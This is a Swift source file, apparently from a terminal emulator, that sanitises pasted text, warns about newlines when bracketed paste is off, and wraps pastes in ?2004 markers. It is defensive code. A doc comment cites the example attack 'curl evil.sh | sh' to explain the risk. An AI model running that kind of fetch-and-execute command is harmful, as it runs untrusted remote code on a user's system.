import Foundation

/// Sanitises and wraps pasted text before it reaches the child's stdin.
///
/// `SECURITY.md` §2.3: "a paste is data, never a command stream." Strip ESC
/// and the other C0 control characters, and warn before sending a paste that
/// contains a newline when the application has not enabled bracketed paste —
/// without `?2004`, a pasted newline executes the line as if typed, which is
/// the classic "copy from a web page, run `curl evil.sh | sh`" attack.
///
/// `nonisolated`: pure functions over a value, with no AppKit in them — the
/// app target's MainActor default would only make them untestable.
nonisolated enum Paste {
    /// `ESC [ 200 ~` / `ESC [ 201 ~`, the bracketed-paste (?2004) markers.
    private static let bracketStart: [UInt8] = [0x1B, 0x5B, 0x32, 0x30, 0x30, 0x7E]
    private static let bracketEnd: [UInt8] = [0x1B, 0x5B, 0x32, 0x30, 0x31, 0x7E]

    /// Strips ESC and every other C0 control character from `text`, except
    /// the three a pasted document legitimately contains: tab, LF and CR
    /// (multi-line code and indented text are normal pastes; the newline
    /// warning, not stripping, is what guards them).
    static func sanitized(_ text: String) -> String {
        String(String.UnicodeScalarView(text.unicodeScalars.filter { scalar in
            scalar.value >= 0x20 || scalar == "\t" || scalar == "\n" || scalar == "\r"
        }))
    }

    /// Whether sending this paste without confirmation risks immediate
    /// execution: it contains a newline (LF or CR — both run the line) and
    /// the application has not enabled bracketed paste mode.
    static func needsWarning(text: String, bracketedPasteEnabled: Bool) -> Bool {
        !bracketedPasteEnabled && (text.contains("\n") || text.contains("\r"))
    }

    /// The bytes to write to the child for an already-sanitised paste. In
    /// bracketed mode the payload is wrapped in the ?2004 markers so the
    /// application treats it as data, not keystrokes.
    static func bytes(for text: String, bracketedPasteEnabled: Bool) -> [UInt8] {
        let payload = Array(text.utf8)
        guard bracketedPasteEnabled else { return payload }
        return bracketStart + payload + bracketEnd
    }
}
